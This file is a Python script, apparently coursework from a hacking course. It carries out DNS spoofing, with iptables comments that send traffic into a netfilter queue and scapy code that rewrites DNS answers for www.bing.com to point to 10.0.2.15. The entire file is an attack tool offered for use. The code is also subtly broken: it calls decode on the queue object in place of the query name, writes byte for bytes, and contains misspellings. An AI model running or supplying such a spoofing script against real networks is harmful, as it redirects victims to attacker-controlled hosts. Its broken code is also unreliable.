#!/usr/bin/env python
#setting up of queue and access
#if attacking on same machine execute next two lines
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0
#at last execute ---- iptable --flush
#lecture 65-66
#Python3----------------------



import netfilterqueue
import scapy.all as scapy
from scapy.layers import http

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.DNSRR):		##DNSRR-response DNSRQ request
		quene_name=scapy_packet[scapy.DNSQR].qname
		if "www.bing.com" in queue.decode():
			print("[+] Spoofing target")
			answer = scapy.DNSRR(rrname = quene_name, rdata = "10.0.2.15")  #spoofed answer
			scapy_packet[scapy.DNS].an = answer
			scapy_packet[scapy.DNS].ancount = 1
	
			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum

			packet.set_payload(byte(scapy_packet))
	packet.accept()



queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  
queue.run()


